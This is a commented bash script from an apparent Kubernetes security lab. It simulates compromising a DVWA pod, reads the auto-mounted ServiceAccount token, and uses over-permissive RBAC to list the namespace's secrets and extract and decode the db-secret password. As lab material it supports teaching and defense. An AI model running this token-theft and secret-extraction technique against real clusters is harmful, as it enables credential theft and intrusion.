#!/usr/bin/env bash
#
# Phase 2 - Scénario d'incident simulé : compromission du pod DVWA (app2-dvwa)
# -----------------------------------------------------------------------------
# Reproduit l'attaque de l'énoncé TP3 (étape 0) :
#   1. on simule un pod compromis (kubectl exec)
#   2. on récupère le token du ServiceAccount auto-monté
#   3. on prouve qu'un appel SANS token est refusé (401/403)
#   4. on abuse de l'API Kubernetes AVEC le token (RBAC trop permissif)
#   5. on liste puis on exfiltre le Secret db-secret, et on décode le mot de passe
#
# NB : l'image DVWA (Debian 9) n'embarque pas `curl`. On utilise donc `php`
#      (présent car DVWA est une appli PHP) pour parler à l'API Kubernetes.
#      L'attaque ne dépend que d'outils déjà dans le conteneur.
#
# Prérequis : bloc lab/ déployé (kubectl apply -f lab/) et pod Ready.
# Usage     : bash incident-attack.sh
set -uo pipefail

NS=lab
POD=$(kubectl get pod -n "$NS" -l app=app2-dvwa -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
[ -z "${POD:-}" ] && { echo "✗ Pod DVWA introuvable. Déploie : kubectl apply -f lab/"; exit 1; }

echo "==> Pod cible (simulé compromis) : $POD"

# ---- Tout ce bloc PHP s'exécute DANS le pod (point de vue attaquant) ----
kubectl exec -n "$NS" "$POD" -- php -r '
function api($path, $token = null) {
  $h = "Accept: application/json\r\n";
  if ($token) $h .= "Authorization: Bearer $token\r\n";
  $ctx = stream_context_create([
    "http" => ["method"=>"GET","header"=>$h,"ignore_errors"=>true],
    "ssl"  => ["verify_peer"=>false,"verify_peer_name"=>false],
  ]);
  $body = @file_get_contents("https://kubernetes.default.svc".$path, false, $ctx);
  $code = isset($http_response_header[0]) ? $http_response_header[0] : "no response";
  return [$code, $body];
}

$sa = "/var/run/secrets/kubernetes.io/serviceaccount";
$token = trim(file_get_contents("$sa/token"));
printf("\n==> [1] Token du ServiceAccount auto-monté récupéré (%d caractères)\n", strlen($token));

echo "\n==> [2] Appel SANS token -> refus attendu\n";
list($code,) = api("/api/v1/namespaces/lab/secrets");
echo "    $code\n";

echo "\n==> [3] Appel AVEC token -> liste des secrets de lab (RBAC permissif)\n";
list($code,$body) = api("/api/v1/namespaces/lab/secrets", $token);
echo "    $code\n";
preg_match_all("/\"name\":\"([^\"]+)\"/", $body, $m);
foreach (array_unique($m[1]) as $n) echo "    - secret: $n\n";

echo "\n==> [4] Exfiltration ciblée du Secret db-secret\n";
list($code,$body) = api("/api/v1/namespaces/lab/secrets/db-secret", $token);
$j = json_decode($body, true);
foreach (($j["data"] ?? []) as $k=>$v) {
  printf("    %-9s base64=%-28s clair=%s\n", $k.":", $v, base64_decode($v));
}
'
rc=$?
echo
if [ $rc -eq 0 ]; then
  echo "================ Démontré ================"
  echo "  - Pod compromis -> token SA accessible"
  echo "  - RBAC trop permissif (get/list secrets)"
  echo "  - Abus de l'API Kubernetes depuis le pod"
  echo "  - Exfiltration + décodage d'un secret en clair"
  echo "=========================================="
else
  echo "✗ Le scénario a échoué (rc=$rc)"
fi
